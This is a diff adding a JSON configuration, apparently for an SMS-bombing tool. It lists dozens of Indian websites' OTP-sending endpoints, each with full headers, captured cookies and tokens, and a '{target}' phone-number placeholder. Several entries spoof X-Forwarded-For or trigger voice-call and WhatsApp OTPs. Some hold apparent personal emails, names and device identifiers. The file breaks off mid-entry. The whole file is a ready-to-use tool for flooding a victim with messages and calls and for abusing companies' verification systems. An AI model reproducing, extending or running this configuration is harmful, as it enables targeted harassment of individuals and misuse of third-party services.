@@ -1,0 +1,1151 @@
+{
+  "sms": {
+    "91": [
+      {
+        "name": "lendingplate",
+        "method": "POST",
+        "url": "https://lendingplate.com/api.php",
+        "headers": {
+          "Connection": "keep-alive",
+          "Content-Length": "45",
+          "sec-ch-ua-platform": "\"Android\"",
+          "X-Requested-With": "XMLHttpRequest",
+          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+          "Accept": "application/json, text/javascript, */*; q=0.01",
+          "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "sec-ch-ua-mobile": "?1",
+          "Origin": "https://lendingplate.com",
+          "Sec-Fetch-Site": "same-origin",
+          "Sec-Fetch-Mode": "cors",
+          "Sec-Fetch-Dest": "empty",
+          "Referer": "https://lendingplate.com/personal-loan",
+          "Accept-Encoding": "gzip, deflate, br, zstd",
+          "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
+          "Cookie": "_fbp=fb.1.1745235455885.251422456376518259; _gcl_au=1.1.241418330.1745235457; _gid=GA1.2.593762244.1745235461; PHPSESSID=ed051a5ea7783741eacfd602c6a192d3; _ga=GA1.1.1324264906.1745235460; _ga_MZBRRWYESB=GS1.1.1745235460.1.1.1745235474.46.0.0; moe_uuid=370f7dae-9313-4d44-8e38-efe54c437df8; _ga_KVRZ90DE3T=GS1.1.1745235460.1.1.1745235496.24.0.0"
+        },
+        "data": {
+          "mobiles": "{target}",
+          "resend": "Resend",
+          "clickcount": "3"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "daycoindia",
+        "method": "POST",
+        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
+        "headers": {
+          "Content-Length": "61",
+          "sec-ch-ua-platform": "\"Android\"",
+          "X-Requested-With": "XMLHttpRequest",
+          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+          "Accept": "application/json, text/javascript, */*; q=0.01",
+          "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "sec-ch-ua-mobile": "?1",
+          "Origin": "https://ekyc.daycoindia.com",
+          "Sec-Fetch-Site": "same-origin",
+          "Sec-Fetch-Mode": "cors",
+          "Sec-Fetch-Dest": "empty",
+          "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
+          "Accept-Encoding": "gzip, deflate, br, zstd",
+          "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
+          "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
+          "Priority": "u=1, i"
+        },
+        "data": {
+          "api": "send_otp",
+          "brand": "dayco",
+          "mob": "{target}",
+          "resend_otp": "resend_otp"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "nobroker",
+        "method": "POST",
+        "url": "https://www.nobroker.in/api/v3/account/otp/send",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+          "Accept-Encoding": "gzip, deflate, br, zstd",
+          "Content-Type": "application/x-www-form-urlencoded",
+          "sec-ch-ua-platform": "Android",
+          "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+          "sec-ch-ua-mobile": "?1",
+          "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
+          "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
+          "origin": "https://www.nobroker.in",
+          "sec-fetch-site": "same-origin",
+          "sec-fetch-mode": "cors",
+          "sec-fetch-dest": "empty",
+          "referer": "https://www.nobroker.in/",
+          "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
+          "priority": "u=1, i",
+          "Cookie": "cloudfront-viewer-address=2001%3A4860%3A7%3A508%3A%3Aef%3A33486; cloudfront-viewer-country=MY; cloudfront-viewer-latitude=2.50000; cloudfront-viewer-longitude=112.50000; headerFalse=false; isMobile=true; deviceType=android; js_enabled=true; nbcr=bangalore; nbpt=RENT; nbSource=www.google.com; nbMedium=organic; nbCampaign=https%3A%2F%2Fwww.google.com%2F; nb_swagger=%7B%22app_install_banner%22%3A%22bannerB%22%7D; _gcl_au=1.1.1907920311.1745238224; _gid=GA1.2.1607866815.1745238224; _ga=GA1.2.777875435.1745238224; nbAppBanner=close; cto_bundle=jK9TOl9FUzhIa2t2MUElMkIzSW1pJTJCVnBOMXJyNkRSSTlkRzZvQUU0MEpzRXdEbU5ySkI0NkJOZmUlMkZyZUtmcjU5d214YkpCMTZQdTJDb1I2cWVEN2FnbWhIbU9oY09xYnVtc2VhV2J0JTJCWiUyQjl2clpMRGpQaVFoRWREUzdyejJTdlZKOEhFZ2Zmb2JXRFRyakJQVmRNaFp2OG5YVHFnJTNEJTNE; _fbp=fb.1.1745238225639.985270044964203739; moe_uuid=901076a7-33b8-42a8-a897-2ef3cde39273; _ga_BS11V183V6=GS1.1.1745238224.1.1.1745238241.0.0.0; _ga_STLR7BLZQN=GS1.1.1745238224.1.1.1745238241.0.0.0; mbTrackID=b9cc4f8434124733b01c392af03e9a51; nbDevice=mobile; nbccc=21c801923a9a4d239d7a05bc58fcbc57; JSESSION=5056e202-0da2-4ce9-8789-d4fe791a551c; _gat_UA-46762303-1=1; _ga_SQ9H8YK20V=GS1.1.1745238224.1.1.1745238326.18.0.1658024385"
+        },
+        "data": {
+          "phone": "{target}",
+          "countryCode": "IN"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "shiprocket",
+        "method": "POST",
+        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+          "Accept": "application/json",
+          "Accept-Encoding": "gzip, deflate, br, zstd",
+          "Content-Type": "application/json",
+          "sec-ch-ua-platform": "Android",
+          "authorization": "Bearer null",
+          "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+          "sec-ch-ua-mobile": "?1",
+          "origin": "https://app.shiprocket.in",
+          "sec-fetch-site": "same-site",
+          "sec-fetch-mode": "cors",
+          "sec-fetch-dest": "empty",
+          "referer": "https://app.shiprocket.in/",
+          "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
+          "priority": "u=1, i"
+        },
+        "json": {
+          "mobileNumber": "{target}"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "gokwik",
+        "method": "POST",
+        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+          "Accept": "application/json, text/plain, */*",
+          "Accept-Encoding": "gzip, deflate, br, zstd",
+          "Content-Type": "application/json",
+          "gk-version": "20250421065835697",
+          "gk-timestamp": "58174641",
+          "sec-ch-ua-platform": "Android",
+          "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc0NTIzOTI0MywiZXhwIjoxNzQ1MjM5MzAzfQ.-gV0sRUkGD4SPGPUUJ6XBanoDCI7VSNX99oGsUU5nWk",
+          "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+          "gk-signature": "076108",
+          "gk-udf-1": "951",
+          "sec-ch-ua-mobile": "?1",
+          "gk-request-id": "a0cecd38-e690-48d5-ab80-b9d2feed3761",
+          "gk-merchant-id": "19g6jlc658iad",
+          "origin": "https://pdp.gokwik.co",
+          "sec-fetch-site": "same-site",
+          "sec-fetch-mode": "cors",
+          "sec-fetch-dest": "empty",
+          "referer": "https://pdp.gokwik.co/",
+          "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
+          "priority": "u=1, i"
+        },
+        "json": {
+          "phone": "{target}",
+          "country": "in"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "gopinkcabs",
+        "method": "POST",
+        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "Accept": "*/*",
+          "X-Requested-With": "XMLHttpRequest",
+          "Origin": "https://www.gopinkcabs.com",
+          "Sec-Fetch-Site": "same-origin",
+          "Sec-Fetch-Mode": "cors",
+          "Sec-Fetch-Dest": "empty",
+          "Referer": "https://www.gopinkcabs.com/app/cab/customer/step1.php",
+          "Accept-Encoding": "gzip, deflate, br, zstd",
+          "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+          "Sec-CH-UA-Platform": "\"Android\"",
+          "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
+          "Sec-CH-UA-Mobile": "?1",
+          "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
+          "Cookie": "PHPSESSID=mor5basshemi72pl6d0bp21kso; mylocation=#"
+        },
+        "data": {
+          "check_mobile_number": "1",
+          "contact": "{target}"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "shemaroome",
+        "method": "POST",
+        "url": "https://www.shemaroome.com/users/resend_otp",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "Accept": "*/*",
+          "X-Requested-With": "XMLHttpRequest",
+          "Origin": "https://www.shemaroome.com",
+          "Referer": "https://www.shemaroome.com/users/sign_in",
+          "Accept-Encoding": "gzip, deflate, br, zstd",
+          "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
+          "Cookie": "_pk_id.1.e68e=1ddc9d91406c0a63.1733416698.; theme_option=dark_theme; user_sub_status=U2FsdGVkX1%2Bws%2Bg0YmKfdRAdqYdkkax%2FIcfgmnokzkE%3D"
+        },
+        "data": {
+          "mobile_no": "+91{target}"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "stratzy-sms",
+        "method": "POST",
+        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
+        "headers": {
+          "sec-ch-ua-platform": "\"Android\"",
+          "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+          "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+          "content-type": "application/json",
+          "sec-ch-ua-mobile": "?1",
+          "accept": "*/*",
+          "origin": "https://stratzy.in",
+          "sec-fetch-site": "same-origin",
+          "sec-fetch-mode": "cors",
+          "sec-fetch-dest": "empty",
+          "referer": "https://stratzy.in/login",
+          "accept-encoding": "gzip, deflate, br, zstd",
+          "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+          "cookie": "_fbp=fb.1.1745073074472.847987893655824745; _ga=GA1.1.2022915250.1745073078; _ga_TDMEH7B1D5=GS1.1.1745073077.1.1.1745073132.5.0.0",
+          "priority": "u=1, i"
+        },
+        "json": {
+          "phoneNo": "{target}"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "stratzy-whatsapp",
+        "method": "POST",
+        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
+        "headers": {
+          "sec-ch-ua-platform": "\"Android\"",
+          "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+          "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+          "content-type": "application/json",
+          "sec-ch-ua-mobile": "?1",
+          "accept": "*/*",
+          "origin": "https://stratzy.in",
+          "sec-fetch-site": "same-origin",
+          "sec-fetch-mode": "cors",
+          "sec-fetch-dest": "empty",
+          "referer": "https://stratzy.in/login",
+          "accept-encoding": "gzip, deflate, br, zstd",
+          "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+          "cookie": "_fbp=fb.1.1745073074472.847987893655824745; _ga=GA1.1.2022915250.1745073078; _ga_TDMEH7B1D5=GS1.1.1745073077.1.1.1745073102.35.0.0",
+          "priority": "u=1, i"
+        },
+        "json": {
+          "phoneNo": "{target}"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "khatabook",
+        "method": "POST",
+        "url": "https://api.khatabook.com/v1/auth/request-otp",
+        "headers": {
+          "content-type": "application/json; charset=utf-8",
+          "accept-encoding": "gzip",
+          "user-agent": "okhttp/3.9.1"
+        },
+        "json": {
+          "app_signature": "Jc/Zu7qNqQ2",
+          "country_code": "+91",
+          "phone": "{target}"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "hungama",
+        "method": "POST",
+        "url": "https://communication.api.hungama.com/v1/communication/otp",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+          "Accept": "application/json, text/plain, */*",
+          "Accept-Encoding": "gzip, deflate, br, zstd",
+          "Content-Type": "application/json",
+          "identifier": "home",
+          "mlang": "en",
+          "sec-ch-ua-platform": "\"Android\"",
+          "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+          "sec-ch-ua-mobile": "?1",
+          "alang": "en",
+          "country_code": "IN",
+          "vlang": "en",
+          "origin": "https://www.hungama.com",
+          "sec-fetch-site": "same-site",
+          "sec-fetch-mode": "cors",
+          "sec-fetch-dest": "empty",
+          "referer": "https://www.hungama.com/",
+          "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
+          "priority": "u=1, i"
+        },
+        "json": {
+          "mobileNo": "{target}",
+          "countryCode": "+91",
+          "appCode": "un",
+          "messageId": "1",
+          "emailId": "",
+          "subject": "Register",
+          "priority": "1",
+          "device": "web",
+          "variant": "v1",
+          "templateCode": 1
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "servetel",
+        "method": "POST",
+        "url": "https://api.servetel.in/v1/auth/otp",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
+          "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
+          "Host": "api.servetel.in",
+          "Connection": "Keep-Alive",
+          "Accept-Encoding": "gzip"
+        },
+        "data": {
+          "mobile_number": "{target}"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "smytten",
+        "method": "POST",
+        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
+        "headers": {
+          "Host": "route.smytten.com",
+          "Connection": "keep-alive",
+          "Content-Type": "application/json",
+          "Accept": "application/json, text/plain, */*",
+          "Origin": "https://smytten.com",
+          "X-Requested-With": "pure.lite.browser",
+          "Sec-Fetch-Site": "same-site",
+          "Sec-Fetch-Mode": "cors",
+          "Sec-Fetch-Dest": "empty",
+          "Referer": "https://smytten.com/",
+          "Accept-Encoding": "gzip, deflate, br, zstd",
+          "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+          "Sec-CH-UA-Platform": "\"Android\"",
+          "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
+          "Sec-CH-UA-Mobile": "?1",
+          "Desktop-Request": "false",
+          "Web-Version": "1",
+          "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f",
+          "Request-Type": "web",
+          "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
+        },
+        "json": {
+          "ad_id": "",
+          "device_info": {},
+          "device_id": "",
+          "app_version": "",
+          "device_token": "",
+          "device_platform": "web",
+          "phone": "{target}",
+          "email": "sdhabai09@gmail.com"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "univest",
+        "method": "GET",
+        "url": "https://api.univest.in/api/auth/send-otp",
+        "params": {
+          "type": "web4",
+          "countryCode": "91",
+          "contactNumber": "{target}"
+        },
+        "headers": {
+          "Host": "api.univest.in",
+          "Accept-Encoding": "gzip",
+          "User-Agent": "okhttp/3.9.1"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "pokerbaazi",
+        "method": "POST",
+        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
+        "headers": {
+          "Host": "nxtgenapi.pokerbaazi.com",
+          "content-type": "application/json; charset=utf-8",
+          "accept-encoding": "gzip",
+          "user-agent": "okhttp/3.9.1"
+        },
+        "json": {
+          "mfa_channels": {
+            "phno": {
+              "number": "{target}",
+              "country_code": "+91"
+            }
+          }
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "nuvamawealth",
+        "method": "POST",
+        "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
+        "headers": {
+          "Host": "nma.nuvamawealth.com",
+          "Content-Type": "application/json; charset=utf-8",
+          "Accept-Encoding": "gzip",
+          "User-Agent": "okhttp/3.9.1"
+        },
+        "json": {
+          "screen": "1260 X 2624",
+          "emailID": "paul04964@gmail.com",
+          "gps": "true",
+          "imsi": "",
+          "mobileNo": "{target}",
+          "firstName": "Shiva Riy",
+          "osVersion": "14",
+          "build": "android-phone",
+          "countryCode": "91",
+          "vendor": "samsung",
+          "imei": "181105746967606",
+          "model": "SM-F7110",
+          "req": "generate"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "getswipe",
+        "method": "POST",
+        "url": "https://app.getswipe.in/api/user/mobile_login",
+        "headers": {
+          "Host": "app.getswipe.in",
+          "Content-Type": "application/json; charset=utf-8",
+          "Accept-Encoding": "gzip",
+          "User-Agent": "okhttp/3.9.1"
+        },
+        "json": {
+          "resend": 0.0,
+          "mobile": "{target}"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "brevistay",
+        "method": "POST",
+        "url": "https://www.brevistay.com/cst/app-api/login",
+        "headers": {
+          "Host": "www.brevistay.com",
+          "Content-Type": "application/json; charset=utf-8",
+          "Accept-Encoding": "gzip",
+          "User-Agent": "okhttp/3.9.1"
+        },
+        "json": {
+          "is_otp": 1.0,
+          "mobile": "{target}",
+          "is_password": 0.0
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "shopsy",
+        "method": "POST",
+        "url": "https://www.shopsy.in/api/1/action/view",
+        "headers": {
+          "Host": "www.shopsy.in",
+          "Content-Type": "application/json; charset=utf-8",
+          "Connection": "Keep-Alive",
+          "Accept-Encoding": "gzip",
+          "User-Agent": "okhttp/3.9.1"
+        },
+        "json": {
+          "actionRequestContext": {
+            "type": "LOGIN_IDENTITY_VERIFY",
+            "loginIdPrefix": "+91",
+            "loginId": "{target}",
+            "clientQueryParamMap": {
+              "ret": "/?cmpid=Google-Shopping-PerfMax2-AllProducts-India&gclid=CjwKCAiAqY6tBhAtEiwAHeRopXAJTIrS2X5hOOJmzNAsD6nHlHPQKbsgdim8CouDsrnvUxhaD9NpyhoCNWQQAvD_BwE",
+              "entryPage": "HEADER_ACCOUNT"
+            },
+            "loginType": "MOBILE",
+            "verificationType": "OTP",
+            "screenName": "LOGIN_V4_MOBILE",
+            "sourceContext": "DEFAULT"
+          }
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "dream11",
+        "method": "POST",
+        "url": "https://www.dream11.com/auth/passwordless/init",
+        "headers": {
+          "Host": "www.dream11.com",
+          "Content-Type": "application/json; charset=utf-8",
+          "Accept-Encoding": "gzip",
+          "User-Agent": "okhttp/3.9.1"
+        },
+        "json": {
+          "phoneNumber": "{target}",
+          "templateName": "default",
+          "channel": "sms",
+          "flow": "SIGNIN"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "snapdeal",
+        "method": "POST",
+        "url": "https://m.snapdeal.com/sendOTP",
+        "headers": {
+          "Host": "m.snapdeal.com",
+          "Content-Type": "application/json; charset=utf-8",
+          "Accept-Encoding": "gzip",
+          "User-Agent": "okhttp/3.9.1"
+        },
+        "json": {
+          "purpose": "LOGIN_WITH_MOBILE_OTP",
+          "mobileNumber": "{target}"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "ucoonline",
+        "method": "GET",
+        "url": "https://apps.ucoonline.in/Lead_App/send_message.jsp",
+        "params": {
+          "mob": "",
+          "ref_no": "",
+          "otpv": "",
+          "appRefNo": "",
+          "lgName": "fdgefgdgg",
+          "lgAddress": "dfgdsggfesdggg",
+          "lgPincode": "695656",
+          "lgState": "DL",
+          "lgDistrict": "NORTH DELHI",
+          "lgBranch": "0313",
+          "lgMobileno": "{target}",
+          "lgEmail": "sundeshaakshays@gmail.com",
+          "lgFacilities": "CC",
+          "lgTentAmt": "656556565",
+          "lgRemarks": "efwfwfsafw",
+          "declare_check": "on",
+          "captchaRefno": "315904",
+          "captchaResult": "71",
+          "firstName": "Gjgjgjgv",
+          "password": "ghfughdsy-5_33#",
+          "requestType": "SENDOTP",
+          "mobileNumber": "{target}",
+          "login": "gjghgug@gmail.com",
+          "genderType": "Male"
+        },
+        "headers": {
+          "Referer": "https://apps.ucoonline.in/Lead_App/lead_web.jsp",
+          "Cookie": "JSESSIONID=9AF635F323A70A62FDE04FB64FD56F78.apps1",
+          "Origin": "https://apps.ucoonline.in",
+          "Accept": "*/*",
+          "X-Requested-With": "XMLHttpRequest",
+          "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+          "User-Agent": "Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "doubtnut",
+        "method": "POST",
+        "url": "https://api.doubtnut.com/v4/student/login",
+        "headers": {
+          "version_code": "1160",
+          "has_upi": "false",
+          "device_model": "ASUS_I005DA",
+          "android_sdk_version": "28",
+          "content-type": "application/json; charset=utf-8",
+          "accept-encoding": "gzip",
+          "user-agent": "okhttp/5.0.0-alpha.2"
+        },
+        "json": {
+          "app_version": "7.10.51",
+          "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
+          "course": "",
+          "phone_number": "{target}",
+          "language": "en",
+          "udid": "b751fb63c0ae17ba",
+          "class": "",
+          "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "justdial",
+        "method": "POST",
+        "url": "https://www.justdial.com/functions/whatsappverification.php",
+        "params": {
+          "name": "Hi Jistididi",
+          "rsend": "0",
+          "mob": "{target}"
+        },
+        "headers": {
+          "Host": "www.justdial.com",
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Content-Length": "0",
+          "Connection": "Keep-Alive",
+          "Accept-Encoding": "gzip",
+          "User-Agent": "okhttp/3.9.1"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "swiggy",
+        "method": "POST",
+        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
+        "headers": {
+          "Content-Type": "application/json; charset=utf-8",
+          "Host": "profile.swiggy.com",
+          "User-Agent": "Swiggy-Android",
+          "accept": "application/json; charset=utf-8",
+          "accept-encoding": "gzip",
+          "x-newrelic-id": "UwUAVV5VGwIEXVJRAwcO",
+          "tracestate": "@nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
+          "traceparent": "00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
+          "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI9ZDYiLCJpZCI6IjI1MTM9ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
+          "pl-version": "55",
+          "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
+          "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
+          "version-code": "1161",
+          "app-version": "4.38.1",
+          "latitude": "0.0",
+          "longitude": "0.0",
+          "os-version": "13",
+          "accessibility_enabled": "false",
+          "swuid": "4c27ae3a76b146f3",
+          "deviceid": "4c27ae3a76b146f3",
+          "x-network-quality": "GOOD"
+        },
+        "json": {
+          "mobile": "{target}"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "liquide",
+        "method": "GET",
+        "url": "https://api.v2.liquide.life/api/auth/checkNumber/+91{target}?otpLogin=true",
+        "headers": {
+          "Host": "api.v2.liquide.life",
+          "accept-encoding": "gzip",
+          "User-Agent": "okhttp/3.9.1"
+        },
+        "json": {},
+        "identifier": "false"
+      },
+      {
+        "name": "dehaat",
+        "method": "POST",
+        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
+        "headers": {
+          "Content-Type": "application/json; charset=utf-8",
+          "Host": "oidc.agrevolution.in",
+          "User-Agent": "okhttp/3.9.1"
+        },
+        "json": {
+          "mobile_number": "{target}",
+          "client_id": "kisan-app"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "apna",
+        "method": "POST",
+        "url": "https://production.apna.co/api/userprofile/v1/otp/",
+        "headers": {
+          "content-type": "application/json; charset=utf-8",
+          "Host": "production.apna.co",
+          "accept-encoding": "gzip",
+          "User-Agent": "okhttp/3.9.1"
+        },
+        "json": {
+          "retries": 0,
+          "phone_number": "91{target}",
+          "source": "employer",
+          "hash_type": "employer"
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "housing.com",
+        "method": "POST",
+        "url": "https://mightyzeus.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_LOGIN&isBot=false&source=mobile",
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "okhttp/3.9.1"
+        },
+        "json": {
+          "query": "mutation($email: String, $phone: String, $otpLength: Int) {\n  sendOtp(phone: $phone, email: $email, otpLength: $otpLength) {\n    success\n    message\n  }\n}",
+          "variables": {
+            "phone": "{target}"
+          }
+        },
+        "identifier": "false"
+      },
+      {
+        "name": "samsung_otp_init",
+        "method": "POST",
+        "url": "https://www.samsung.com/in/api/v1/sso/otp/init",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": "{target}"
+        },
+        "data": {
+          "user_id": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "shoppersstop_send_otp",
+        "method": "POST",
+        "url": "https://www.shoppersstop.com//services/v2_1/ssl/sendOTP/OB",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": "{target}"
+        },
+        "data": {
+          "mobile": "{target}",
+          "type": "SIGNIN_WITH_MOBILE"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "kredily_otp",
+        "method": "POST",
+        "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Forwarded-For": "{target}"
+        },
+        "data": {
+          "mobile": "{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "beepkart_otp",
+        "method": "POST",
+        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
+        "headers": {
+          "Content-Type": "application/json",
+          "Origin": "https://www.beepkart.com"
+        },
+        "data": {
+          "phone": "{target}",
+          "source": "myaccount"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "1mg_call_otp",
+        "method": "POST",
+        "url": "https://www.1mg.com/auth_api/v6/create_token",
+        "headers": {
+          "content-type": "application/json",
+          "X-Forwarded-For": "{target}"
+        },
+        "data": {
+          "number": "{target}",
+          "otp_on_call": true
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "snitch_otp",
+        "method": "POST",
+        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
+        "headers": {
+          "Content-Type": "application/json",
+          "client-id": "snitch_secret"
+        },
+        "data": {
+          "mobile_number": "+91{target}"
+        },
+        "identifier": "true"
+      },
+      {
+        "name": "snitch_voice_resend",
+        "method": "POST",
